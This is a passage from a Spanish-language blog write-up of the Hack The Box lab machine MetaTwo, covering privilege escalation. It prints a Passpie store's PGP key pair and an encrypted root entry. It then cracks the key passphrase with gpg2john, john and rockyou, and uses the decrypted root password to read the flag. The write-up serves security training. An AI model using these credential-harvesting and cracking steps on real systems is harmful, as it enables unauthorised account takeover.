</code></pre></div><p>Está <code>.config</code> y <code>.keys</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jnelson@meta2</span>:<span class="code-blue">~</span>$ cat .passpie/.config
{}
<span class="code-green">jnelson@meta2</span>:<span class="code-blue">~</span>$ cat .passpie/.keys
-----BEGIN PGP PUBLIC KEY BLOCK-----

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
fo6KI+w2uXLaw+bIT1XZurDN
=dqsF
-----END PGP PUBLIC KEY BLOCK-----
-----BEGIN PGP PRIVATE KEY BLOCK-----

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
=7Uo6
-----END PGP PRIVATE KEY BLOCK-----
</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>El resultado anterior es un par de claves PGP (pública y privada), que se pueden usar para cifrar mensajes. Veamos lo que hay en <code>root.pass</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jnelson@meta2</span>:<span class="code-blue">~</span>$ cat .passpie/ssh/root.pass
comment: ''
fullname: root@ssh
login: root
modified: 2022-06-26 08:58:15.621572
name: ssh
password: '-----BEGIN PGP MESSAGE-----


  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2  

  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km

  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED

  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf

  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg

  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw

  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr

  lpF0RatbxQGWBks5F3o=

  =uh1B

  -----END PGP MESSAGE-----

  '
</code></pre></div><p>Es un mensaje PGP, por lo que debe estar cifrado con las claves anteriores. Para descifrarlo, podemos usar <a target="_blank" href="https://pgptool.org/">PGP Tool</a> (hay que quitar algunos saltos de línea):</p><p><img alt="MetaTwo 9" src="/images/HTB/MetaTwo/MetaTwo-9.webp"></p><p>Pero requiere una contraseña&mldr; Por suerte, hay una herramienta llamada <code>gpg2john</code> que extrae un <em>hash</em> de la clave privada para que <code>john</code> pueda tratar de romperlo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gpg2john</span> <span class="mtku">private.pgp</span> <span class="code-blue">|</span> <span class="code-dark-green">tee</span> <span class="mtku">hash</span>

File private.pgp
Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) &lt;passpie@local&gt;::private.pgp  

<span class="code-cyan">$</span> <span class="code-dark-green">john</span> --wordlist=$WORDLISTS/rockyou.txt <span class="mtku">hash</span>
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
<span class="code-dark-yellow">blink182</span>         (<span class="code-dark-yellow">Passpie</span>)
1g 0:00:00:05 DONE 0.2000g/s 33.60p/s 33.60c/s 33.60C/s ginger..987654
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
</code></pre></div><p>Usando esta contraseña (<code>blink182</code>) podemos descifrar el mensaje:</p><p><img alt="MetaTwo 10" src="/images/HTB/MetaTwo/MetaTwo-10.webp"></p><p>Y así conseguimos la contraseña de <code>root</code> (<code>p7qfAZt4_A1xo_0x</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jnelson@meta2</span>:<span class="code-blue">~</span>$ su root
Password:
root@meta2:/home/jnelson# cd
root@meta2:~# cat root.txt
f7926c421ac3376a196e9edbff026ae5  
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#explotación-de-sqli">Explotación de SQLi</a></li><li><a href="#explotación-de-xxe">Explotación de XXE</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de resúmenes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>